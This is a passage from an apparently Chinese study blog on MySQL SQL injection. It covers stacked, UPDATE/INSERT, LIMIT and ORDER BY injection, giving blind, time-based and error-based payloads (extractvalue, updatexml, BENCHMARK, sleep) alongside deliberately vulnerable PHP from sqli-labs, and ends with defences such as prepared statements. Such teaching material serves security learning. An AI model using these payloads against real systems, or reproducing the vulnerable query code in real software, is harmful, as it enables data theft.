&lt;p&gt;以 sqllab less-38 举例：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$sql=&amp;quot;SELECT * FROM users WHERE id=&amp;#x27;$id&amp;#x27; LIMIT 0,1&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/* execute multi query */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if (mysqli_multi_query($con1, $sql))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    /* store first result set */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if ($result = mysqli_store_result($con1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if($row = mysqli_fetch_row($result))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;#x27;&amp;lt;font size = &amp;quot;5&amp;quot; color= &amp;quot;#00FF00&amp;quot;&amp;gt;&amp;#x27;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            printf(&amp;quot;Your Username is : %s&amp;quot;, $row[1]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            printf(&amp;quot;Your Password is : %s&amp;quot;, $row[2]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo &amp;quot;&amp;lt;/font&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//            mysqli_free_result($result);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        /* print divider */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (mysqli_more_results($con1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            //printf(&amp;quot;-----------------\n&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     //while (mysqli_next_result($con1));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	echo &amp;#x27;&amp;lt;font size=&amp;quot;5&amp;quot; color= &amp;quot;#FFFF00&amp;quot;&amp;gt;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	print_r(mysqli_error($con1));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	echo &amp;quot;&amp;lt;/font&amp;gt;&amp;quot;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/* close connection */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mysqli_close($con1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;堆叠注入部分参考链接：&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmFja2xpb24vcC85NzIxNjg3Lmh0bWw=&#34;&gt;https://www.cnblogs.com/backlion/p/9721687.html&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220321165558549.png&#34; alt=&#34;image-20220321165558549&#34; style=&#34;zoom:67%;&#34; /&gt;
&lt;h5 id=&#34;update-insert语句中注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#update-insert语句中注入&#34;&gt;#&lt;/a&gt; update /insert 语句中注入&lt;/h5&gt;
&lt;p&gt;sqllab pass-17&lt;/p&gt;
&lt;p&gt;数据外带&lt;/p&gt;
&lt;p&gt;floor 报错注入&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意：update 语句中使用 updatexml 和 extractvalue 报错注入时 update 不会执行，因为 xpath 报错导致程序退出&lt;/strong&gt;&lt;/p&gt;
&lt;h5 id=&#34;limit中注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#limit中注入&#34;&gt;#&lt;/a&gt; limit 中注入&lt;/h5&gt;
&lt;p&gt;只适用于 mysql 版本 &amp;lt; 5.5&lt;/p&gt;
&lt;p&gt;使用存储过程&lt;/p&gt;
&lt;p&gt;为什么要用存储过程？&lt;br&gt;
①将重复性很高的一些操作，封装到一个存储过程中，简化了对这些 SQL 的调用&lt;/p&gt;
&lt;p&gt;②批量处理：SQL + 循环，减少流量&lt;/p&gt;
&lt;p&gt;③统一接口，确保数据的安全&lt;/p&gt;
&lt;p&gt;使用存储过程：&lt;/p&gt;
&lt;p&gt;procedure analyse (1,2) 报错在第一个参数上&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mysql&amp;gt; SELECT field FROM user WHERE id &amp;gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;时间盲注时但存储过程无法使用 sleep，无法盲注，使用 benchmark 代替 sleep&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SELECT field FROM table WHERE id &amp;gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;order-by注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#order-by注入&#34;&gt;#&lt;/a&gt; order by 注入&lt;/h5&gt;
&lt;p&gt;order by 是 mysql 中对查询数据进行排序的方法， 使用示例&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; 表名 &lt;span class=&#34;keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;by&lt;/span&gt; 列名(或者数字) &lt;span class=&#34;keyword&#34;&gt;asc&lt;/span&gt;;  #升序(默认升序)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; 表名 &lt;span class=&#34;keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;by&lt;/span&gt; 列名(或者数字) &lt;span class=&#34;keyword&#34;&gt;desc&lt;/span&gt;;  #降序&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里的重点在于 order by 后既可以填列名或者是一个数字。举个例子： id 是 user 表的第一列的列名，那么如果想根据 id 来排序，有两种写法:&lt;/p&gt;
&lt;p&gt;因此这也就是我们为什么通过 order by 判断列数，我们会把第 x 当做 order by 的条件，如果没有 x 则报错&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;by&lt;/span&gt; id;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;selecr &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;基于 if 盲注：&lt;/p&gt;
&lt;p&gt;需要知道列名&lt;/p&gt;
&lt;p&gt;order by 的列不同，返回的页面当然也是不同的，所以就可以根据排序的列不同来盲注。&lt;/p&gt;
&lt;p&gt;这里如果使用数字代替列名是不行的，因为 if 语句返回的是字符类型，不是整型。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;order by if(1=1,id,username);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;order by if(表达式,1,(select id from information_schema.tables))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果表达式为 false 时，sql 语句会报 ERROR 1242 (21000): Subquery returns more than 1 row 的错误，导致查询内容为空，如果表达式为 true 是，则会返回正常的页面&lt;/p&gt;
&lt;p&gt;基于时间盲注&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;order by if(1=1,1,sleep(1))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;基于 rand () 盲&lt;/p&gt;
&lt;p&gt;可以看到当 rand () 为 true 和 false 时，排序结果是不同的，所以就可以使用 rand () 函数进行盲注了。 rand (true) | rand (false)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;order by rand(ascii(mid((select database()),1,1))&amp;gt;96)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;基于报错注入：&lt;/p&gt;
&lt;p&gt;updatexml 和 extravalue&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select * from ha order by updatexml(1,if(1=1,1,user()),1);#查询正常&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select * from ha order by updatexml(1,if(1=2,1,user()),1);#查询报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;order by 注入的实例&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$sql = &amp;#x27;select * from admin where username=&amp;#x27;&amp;quot;.$username.&amp;quot;&amp;#x27;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$result = mysql_query($sql);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$row = mysql_fetch_array($result);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(isset($row)&amp;amp;&amp;amp;row[&amp;#x27;username&amp;#x27;]!=&amp;quot;admin&amp;quot;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$hit=&amp;quot;username error!&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	if ($row[&amp;#x27;password&amp;#x27;] === $password)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$hit=&amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$hit=&amp;quot;password error!&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;username=admin&amp;#x27; union 1,2,&amp;#x27;字符串&amp;#x27; order by 3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者一般存在的注入点为：可控制的位置在 &lt;code&gt;order by&lt;/code&gt;  子句后，如下 order 参数可控&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;select * from goods order by $_GET[&amp;#x27;order&amp;#x27;]&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaWNlei9wL015c3FsLU9yZGVyLUJ5LUluamVjdGlvbi1TdW1tYXJ5Lmh0bWw=&#34;&gt;Mysql Order By 注入总结 - 艾斯泽 - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjI3Nzg1L2FydGljbGUvZGV0YWlscy8xMTk0MTQwMzI=&#34;&gt;sql 注入之 order by 注入_夜影_321 的博客 - CSDN 博客_orderby sql 注入&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;mysql注入防御&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mysql注入防御&#34;&gt;#&lt;/a&gt; mysql 注入防御&lt;/h3&gt;
&lt;h4 id=&#34;通过函数过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#通过函数过滤&#34;&gt;#&lt;/a&gt; 通过函数过滤&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;$id = addslashed($id);&lt;/code&gt;  使用 \ 转义字符，比如’ &amp;quot; \ NULL&lt;/p&gt;
&lt;p&gt;注意 GPG 开关开启时会默认转义所有输入，如果这时才使用此函数会造成双重转义使转义失效&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$id = addcslashed($id); &lt;/code&gt;  使用 c 语言风格转义函数 \0 \r 等&lt;/p&gt;
&lt;h4 id=&#34;降权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#降权&#34;&gt;#&lt;/a&gt; 降权&lt;/h4&gt;
&lt;p&gt;给每个数据库设置单独的管理员，不使用 root，sa 等高权限用户&lt;/p&gt;
&lt;h4 id=&#34;使用pdo&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用pdo&#34;&gt;#&lt;/a&gt; 使用 PDO&lt;/h4&gt;
&lt;p&gt;预处理语句可以把它看作是想要运行的 SQL 的一种编译过的模板，它可以使用变量参数进行定制。&lt;/p&gt;
&lt;p&gt;查询仅需解析（或预处理）一次，但可以用相同或不同的参数执行多次。当查询准备好后，数据库将分析、编译和优化执行该查询的计划。&lt;/p&gt;
&lt;p&gt;提供给预处理语句的参数不需要用引号括起来，驱动程序会自动处理。如果应用程序只使用预处理语句，可以确保不会发生 SQL 注入。&lt;/p&gt;
&lt;p&gt;预处理语句&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$pdo = new PDO(&amp;quot;mysql:host=127.0.0.1;dbname=test;charset=utf8&amp;quot;, &amp;quot;root&amp;quot;,&amp;quot;root123&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$st = $pdo-&amp;gt;prepare(&amp;quot;select * from users where id =?&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$id = $_GET[&amp;#x27;id&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$st-&amp;gt;bindParam(1, $id);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$st-&amp;gt;execute();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ret = $st-&amp;gt;fetchAll();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print_r($ret);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这与我们平时使用 mysql_real_escape_string 将字符串进行转义，再拼接成 SQL 语句没有差别，只是由 PDO 本地驱动完成转义的（EMULATE_PREPARES）&lt;/p&gt;
&lt;p&gt;PDO 有一项参数，名为 PDO::ATTR_EMULATE_PREPARES ，表示是否使用 PHP 本地模拟 prepare，此项参数默认 true, 我们改为 false 后&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$pdo = new PDO(&amp;quot;mysql:host=127.0.0.1;dbname=test;charset=utf8&amp;quot;, &amp;quot;root&amp;quot;,&amp;quot;root123&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$pdo-&amp;gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);&lt;/span&gt;&lt;br&gt;&lt;span 